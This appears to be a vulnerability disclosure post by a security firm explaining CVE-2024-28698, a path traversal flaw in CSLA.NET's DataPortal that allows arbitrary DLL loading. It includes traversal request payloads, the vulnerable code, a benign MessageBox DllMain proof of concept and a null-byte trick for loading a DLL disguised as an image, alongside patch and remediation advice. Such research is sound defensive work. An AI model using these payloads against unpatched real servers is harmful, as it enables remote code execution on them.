[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)What we do[Continuous vulnerability management](/continuous-vulnerability-management)[Attack surface management](/attack-surface-management)[REPORTING & COMPLIANCE](/effortless-reporting-compliance)How we do it[External vulnerability scanning](/external-vulnerability-scanner)[Internal vulnerability scanning](/internal-vulnerability-scanner)[Cloud vulnerability scanning](/cloud-vulnerability-scanning-for-aws-google-cloud-and-azure)[Web Application vulnerability scanning](/web-application-vulnerability-scanner)[API vulnerability scanning](/vulnerability-scanner/api-scanner)[REPORTING](/intelligent-issue-prioritisation)[Pricing](/pricing)Resources[DEVELOPER HUB](https://developers.intruder.io/docs?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[Integration partners](/integration-partners)[HELP CENTRE](https://help.intruder.io/en/?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[BLOG](/blog)[SUCCESS STORIES](/success-stories)[RESEARCH](/research)[WEBINARS](/webinars)[INTEL](https://intel.intruder.io/)Company[ABOUT US](/about-us)[CONTACT](/contact)[trust center](https://trust.intruder.io/)[BECOME A PARTNER](/partners/become-a-partner)[CAREERS](https://careers.intruder.io/?_gl=1*1nmt3bk*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NzI0OTQ3NS4yOC4xLjE2ODcyNDk0NzYuNTkuMC4w)[Login](https://accounts.intruder.io/login)[Try for free](https://portal.intruder.io/free_trial)[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)What we do[Continuous vulnerability management](/continuous-vulnerability-management)[Attack surface management](/attack-surface-management)[REPORTING & COMPLIANCE](/effortless-reporting-compliance)How we do it[External vulnerability scanning](/external-vulnerability-scanner)[Internal vulnerability scanning](/internal-vulnerability-scanner)[Cloud vulnerability scanning](/cloud-vulnerability-scanning-for-aws-google-cloud-and-azure)[Web Application vulnerability scanning](/web-application-vulnerability-scanner)[API vulnerability scanning](/vulnerability-scanner/api-scanner)[REPORTING](/intelligent-issue-prioritisation)[Pricing](/pricing)Resources[DEVELOPER HUB](https://developers.intruder.io/docs?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[Integration partners](/integration-partners)[HELP CENTRE](https://help.intruder.io/en/?_gl=1*9iuogt*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NjU0NDQ1MS4xOS4wLjE2ODY1NDQ0NTEuNjAuMC4w)[BLOG](/blog)[SUCCESS STORIES](/success-stories)[RESEARCH](/research)[WEBINARS](/webinars)[INTEL](https://intel.intruder.io/)Company[ABOUT US](/about-us)[CONTACT](/contact)[trust center](https://trust.intruder.io/)[BECOME A PARTNER](/partners/become-a-partner)[CAREERS](https://careers.intruder.io/?_gl=1*1nmt3bk*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NzI0OTQ3NS4yOC4xLjE2ODcyNDk0NzYuNTkuMC4w)[Login](https://accounts.intruder.io/login)[Try for free](https://portal.intruder.io/free_trial)[Research](/research)
# Path Traversal and Code Execution in CSLA.NET (CVE-2024-28698)

![Sam Pizzey](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/660dd5c2edbcbc8902b9ad5a_6191a88a1c0e39463c2bf022_placeholder-image.svg)AuthorSam Pizzeyâ¢Security ConsultantUpdatedTuesday, October 15, 2024|PublishedJuly 19, 2024|min read

CSLA.NET is a framework that helps structure business logic for .NET applications into re-usable objects and share those objects between systems. During a penetration test last year, we discovered an interesting path traversal vulnerability affecting applications using this framework. This vulnerability allows an attacker to execute code remotely if they are also able to upload a file to the server, as was the case in our penetration test. This was reported to the vendor, patched in version 8.0, and assigned [CVE-2024-28698](https://intel.intruder.io/cves/CVE-2024-28698).

If your application uses CSLA.NET before version 8.0 and allows users to upload files to your web server, you should update the framework as soon as possible. If you are unable to update, you should manually apply [this change](https://github.com/MarimerLLC/csla/pull/3552/commits/c2fb81c0418632a79b1ac988f6fa5741f1163114).

The rest of this post is a technical explanation of how the vulnerability works - and a bonus tip on using null bytes in .NET to truncate paths, like it's 1999. ð

## Discovery

While performing some web application testing for a client, I noticed some responses from `/api/DataPortal`, which contained an unusual format I wasn't familiar with:

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[â¦]

:Csla.Server.Hosts.DataPortalChannel.DataPortalResponse, /c [â¦]Csla.Server.Hosts.DataPortalChannel.DataPortalErrorInfo, Csla, Version=7.0.0.0, Culture=neutral, PublicKeyToken=93be5fdc093e4c30ExceptionTypeName-System.IO.FileNotFoundExceptionMessageCould not load file or assembly 'C:\Users\Sam\Downloads\csla-7.0.3 (1)\csla-7.0.3\Samples\BlazorExample\BlazorExample\Server\bin\Debug\net7.0\BlazorExample.Shared\..\..\..\xxx.dll'. The system cannot find the file specified[â¦]

```

â*Note: This format contains non-printable characters between the fields, which are not reproduced here.*

It looked similar to BinaryFormatter, which is [unsafe to expose to users](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide), but a closer inspection revealed it was a different protocol.

Clues included in the request such as `Csla.Server.Hosts.DataPortalChannel` pointed to the [CSLA.NET](https://cslanet.com/) project - this endpoint was a CSLA [DataPortal](https://cslanet.com/5.4.2/html/class_csla_1_1_server_1_1_data_portal.html) which was being exposed to the applicationâs front-end. The request was using CSLA.NETâs custom `MobileFormatter` format.

I couldnât find any previous security research into this format, suggesting that it might be a likely area for finding vulnerabilities. When dealing with unknown protocols, combining fuzzing with Burp Intruder and some guesswork is a good first step for working out potential weak points. Specifically, I often find it worth focusing on fuzzing locations which look like boundaries between fields. When doing this here, the following error was generated:

**Request**

```
POST /api/DataPortal?operation=fetch HTTP/1.1
[â¦]

7Csla.Server.Hosts.DataPortalChannel.CriteriaRequest, /c [â¦]lBlazorExample.Shared.PersonList, BlazorExample.SharedXXX, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

```

â**Response**

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[â¦]

:Csla.Server.Hosts.DataPortalChannel.DataPortalResponse, /c [â¦]Csla.Server.Hosts.DataPortalChannel.DataPortalErrorInfo, Csla, Version=7.0.0.0, Culture=neutral, PublicKeyToken=93be5fdc093e4c30ExceptionTypeName-System.IO.FileNotFoundExceptionMessageCould not load file or assembly 'C:\Users\Sam\Downloads\csla-7.0.3 (1)\csla-7.0.3\Samples\BlazorExample\BlazorExample\Server\bin\Debug\net7.0\BlazorExample.SharedXXX.dll'. The system cannot find the file specified[â¦]

```

This error indicated that the application was trying to load a DLL file from a path containing a user-supplied string, and then failing because it doesn't exist. This is unusual and potentially insecure, as if the application loads a user-provided DLL file, an attacker can execute arbitrary code. Next, I tried a path traversal payload in the same location, to see if I could choose the directory the library was loaded from â perhaps one that contains user-uploaded files.

**Request**

```
POST /api/DataPortal?operation=fetch HTTP/1.1
[â¦]

7Csla.Server.Hosts.DataPortalChannel.CriteriaRequest, /c [â¦]lBlazorExample.Shared.PersonList, BlazorExample.Shared\..\..\..\xxx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

```

**Response**

```
HTTP/1.1 200 OK
Content-Type: application/octet-stream
[â¦]

:Csla.Server.Hosts.DataPortalChannel.DataPortalResponse, /c [â¦]Csla.Server.Hosts.DataPortalChannel.DataPortalErrorInfo, Csla, Version=7.0.0.0, Culture=neutral, PublicKeyToken=93be5fdc093e4c30ExceptionTypeName-System.IO.FileNotFoundExceptionMessageCould not load file or assembly 'C:\Users\Sam\Downloads\csla-7.0.3 (1)\csla-7.0.3\Samples\BlazorExample\BlazorExample\Server\bin\Debug\net7.0\BlazorExample.Shared\..\..\..\xxx.dll'. The system cannot find the file specified[â¦]

```

This also worked. So, if I was able to upload a DLL file to the server, for example by using file upload functionality provided by the application, I could load it into the web application using this bug and gain code execution, using a library which executes code as soon as it is loaded.

## The Details

Taking a look at the code for MobileFormatter, we can see that it can't usually be used with arbitrary objects - only basic .NET types, and classes that implement the `IMobileObject` interface. But, if we look at the code that performs this check, starting at `DeserializeAsDTO`, we see that [first it calls](https://github.com/MarimerLLC/csla/blob/91921c07ac5679f986147554b9f8ddf350bbe2c0/Source/Csla/Serialization/Mobile/MobileFormatter.cs#L256-L263) `GetTypeFromCache` with the user input as a parameter:

```
public object DeserializeAsDTO(List<SerializationInfo> deserialized)
{

	_deserializationReferences = new Dictionary<int, IMobileObject>();
	foreach (SerializationInfo info in deserialized)
	{
		var typeName = AssemblyNameTranslator.GetAssemblyQualifiedName(info.TypeName);
		Type type = GetTypeFromCache(typeName);

```

If this type isn't already cached, the `GetTypeFromCache` [function calls](https://github.com/MarimerLLC/csla/blob/91921c07ac5679f986147554b9f8ddf350bbe2c0/Source/Csla/Serialization/Mobile/MobileFormatter.cs#L196-L201) `MethodCaller.GetType` to get the type name:

```
private Type GetTypeFromCache(string typeName)
{
	Type result;
	if (!_typeCache.TryGetValue(typeName, out result))
	{
		result = Csla.Reflection.MethodCaller.GetType(typeName);

```

And [this function](https://github.com/MarimerLLC/csla/blob/845d4811e86f0951c5c725a665d11d1f71a28873/Source/Csla/Reflection/MethodCaller.cs#L251-L257) calls `LoadFromAssemblyPath`, a .NET standard library function which loads a .NET Assembly from a DLL. This function is used to load the assembly using the name provided by the user, but doesnât first validate the input is safe against path traversal:

```
string[] splitName = typeName.Split(',');

if (splitName.Length > 2)
{
	var asm = AssemblyLoadContext.Default.LoadFromAssemblyPath(AppContext.BaseDirectory + splitName[1].Trim() + ".dll");

	return asm.GetType(splitName[0].Trim());

```

The library should check here that the DLL resides within the application directory to prevent arbitrary DLLs from being loaded from the filesystem - the latest version of CSLA now does this.

## Practical Exploitation

Now that we can trick the framework into loading an assembly file of our choice, how can we use this to execute code?

A variety of methods exist for executing code when a DLL is loaded. In this case, I chose to use a native Windows DLL. Even when loading a native library, the .NET AssemblyLoader will still call `DllMain`, so we can keep our payload simple and avoid having to write a .NET Module Loader:

```
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
  switch(reason) {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, L"Attacker controlled code displayed me", L"Hello from the DLL", MB_OK);
  }

  return TRUE;
}
```

There is another issue preventing realistic exploitation however - the [vulnerable code](https://github.com/MarimerLLC/csla/blob/845d4811e86f0951c5c725a665d11d1f71a28873/Source/Csla/Reflection/MethodCaller.cs#L255-L257) always appends the extension `.dll` to the end of the file that it tries to load, meaning that the file needs to be named `something.dll`. It is common to find a web application that will allow uploading images, text files and so on, but rare to find one that allows us to upload a DLL file.

However, `LoadFromAssemblyPath` will truncate the `assemblyFile` parameter when it reaches a null-byte, in a manner very similar to the null-byte Injection attacks in PHP of years gone by. By placing a null-byte after the filename in the serialised data, the '.dll' part will be ignored and we can load our assembly from a Â file that the application assumes to be a safe file type, such as an image, as shown in snippet of a malicious request, when viewed in hex format so that the null-byte can be seen:

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/670e436243d63d270ccf93e9_669945fab6eb3e1df3f123c2_CSLA%25204.png)

The above techniques can be combined against the `BlazorExample` sample project from the CSLA repository. First, the malicious DLL is placed using the filename `xxx.jpg` into a directory a few levels up from the target application, to simulate file upload functionality as the `BlazorExample` application doesnât contain any.

Then, a malicious DataPortal request is made with this filename, using a null-byte at the end to truncate the path. The malicious payload in our library is executed and the dialog box is shown â in this case over the top of the `BlazorExample` interface since this is a development environment, but in a real application this would be executed on the web server remotely:

![](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/670e436243d63d270ccf93e5_669943fced007620ad2d4b1c_CSLA5.png)

As a developer, itâs important to be careful when writing applications that deal with user-supplied file paths â the path must always be validated to ensure nobody can trick the server into using a location you didnât intend them to. Be careful of differences between operating systems! Some characters that are safe to include in a path on one may be unsafe on another. If unsure, the best bet is always to normalize the path after it has been built (most platforms have a built-in API for doing this), and then after it has been normalized to remove any âtraversalâ characters, check that the resulting path is where you expect it to be.

## Timeline

* 23 August 2023 - Initial disclosure to the CSLA project.
* 25 August 2023 - Response from CLSA & a request for more information.
* 25 August 2023 - Further information provided.
* 10 November 2023 - Follow-up from Intruder asking if there was any progress on a fix.
* 10 November 2023 - Potential fix committed by CSLA for review.
* 13 November 2023 - Fix merged into the CSLA `main` branch, available to developers.
* 3 April 2024 - CSLA 8.0 released, which contains the fix.
## Other research articles

[![Path Traversal and Code Execution in CSLA.NET (CVE-2024-28698)](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/6699343aa6692b92e8724f39_Exposure-Management-thumbnail.jpg)
### Path Traversal and Code Execution in CSLA.NET (CVE-2024-28698)

CSLA.NET is a framework that helps structure business logic for .NET applications into re-usable objects, and share those objects between systems. During a penetration test last year, we discovered an interesting path traversal vulnerability affecting applications using this framework. Read on for a technical explanation of how this vulnerability works.](/research/path-traversal-and-code-execution-in-csla-net-cve-2024-28698) [![Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/656ef8e8cdd20af66afefc46_hack_ourselves_pt2-sq.webp)
### Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari

This is the second post in a two-part series on DNS rebinding. In this post, I introduce new techniques for achieving reliable, split-second DNS rebinding in Chrome, Edge, and Safari when IPv6 is available, as well as a technique for bypassing the local network restrictions applied to the fetch API in Chromium-based browsers.](/research/split-second-dns-rebinding-in-chrome-and-safari) [![We Hacked Ourselves With DNS Rebinding](https://cdn.prod.website-files.com/61dd9339d05701829d0b3241/656763af3d579c5e70fe628c_hack_ourselves_pt1-sq.webp)
### We Hacked Ourselves With DNS Rebinding

This post is the first in a two-part series on DNS rebinding in web browsers. In this post, I will talk about a bug we found in our own product which allowed us to retrieve low-privileged AWS credentials using DNS rebinding. In the next post, I will share new techniques to reliably achieve split-second DNS rebinding in Chrome, Edge, and Safari, as well as bypass Chrome's restrictions on requests to private networks.â](/research/we-hacked-ourselves-with-dns-rebinding)
## Sign up for your free 14-day trial

[Start today](https://portal.intruder.io/free_trial)![7 days free trial](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/649161f655ece2717e597fec_cta-image-2.png)[![Intruder logo](https://cdn.prod.website-files.com/61dd9339d05701b1440b323d/64931cbdee18510b47f41730_Logo.svg)](/)WHAT WE DO[Vulnerability Management](https://www.intruder.io/continuous-vulnerability-management)[Attack Surface Management](/attack-surface-management)[Reporting and Compliance](/effortless-reporting-compliance)Comparisons[Intruder vs Acunetix](/acunetix-alternative)[Intruder vs Qualys](/qualys-alternative)[Intruder vs Rapid7](/rapid7-alternative)[Intruder vs Netsparker (Invicti)](/netsparker-alternative)[Intruder vs Detectify](/detectify-alternative)[Intruder vs Pentest-Tools.com](/pentest-tools-com-alternative)HOW WE DO IT[External Vulnerability Scanner](/external-vulnerability-scanner)[Internal Vulnerability Scanner](/internal-vulnerability-scanner)[Cloud Vulnerability Scanner](/cloud-vulnerability-scanning-for-aws-google-cloud-and-azure)[Web App Vulnerability Scanner](/web-application-vulnerability-scanner)[APIÂ Vulnerability Scanner](/vulnerability-scanner/api-scanner)[Automated Penetration Testing](/automated-penetration-testing)COMPLIANCE[SOC 2](https://www.intruder.io/compliance/soc-2-vulnerability-management)[ISO 27001](https://www.intruder.io/compliance/iso-27001-vulnerability-management)[PCI DSS](https://www.intruder.io/compliance/pci-vulnerability-management)Resources[Developer Hub](https://developers.intruder.io/docs?_gl=1*45xq2q*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[Integration Partners](/integration-partners)[Help Centre](https://help.intruder.io/en/?_gl=1*45xq2q*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[Blog](/blog)[Success Stories](/success-stories)[Research](/research)[Webinars](/webinars)[Intel](https://intel.intruder.io/)Company[About Us](/about-us)[Contact](/contact)[Become a Partner](/partners/become-a-partner)[Careers (We're hiring!)](https://careers.intruder.io/?_gl=1*v6z0gl*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[![Protected by Intruder badge](https://storage.googleapis.com/intruder-assets/20230609/intruder-badge.svg)](https://help.intruder.io/en/articles/4086526-intruder-badges)Contact usÂ© 2024 Intruder Systems Ltd.[Privacy Policy](/privacy)[Terms of Service](/legal/terms)[Status](https://status.intruder.io/?_gl=1*v6z0gl*_ga*MTQwOTAxMDU5NC4xNjgyNTk3MDI0*_ga_ME4CJVYS32*MTY4NTg5MzY1Mi4xMS4xLjE2ODU4OTQyNTAuNTUuMC4w)[Security](/security)[Trust center](https://trust.intruder.io/)[Sitemap](/sitemap)Registered in England, VAT Number GB228985360. Intruder is a trading name of Intruder Systems Ltd, Company Registration Number 09529593.

![](https://dc.ads.linkedin.com/collect/?pid=365706&fmt=gif)

[![ClickCease](https://monitor.clickcease.com)](https://www.clickcease.com)

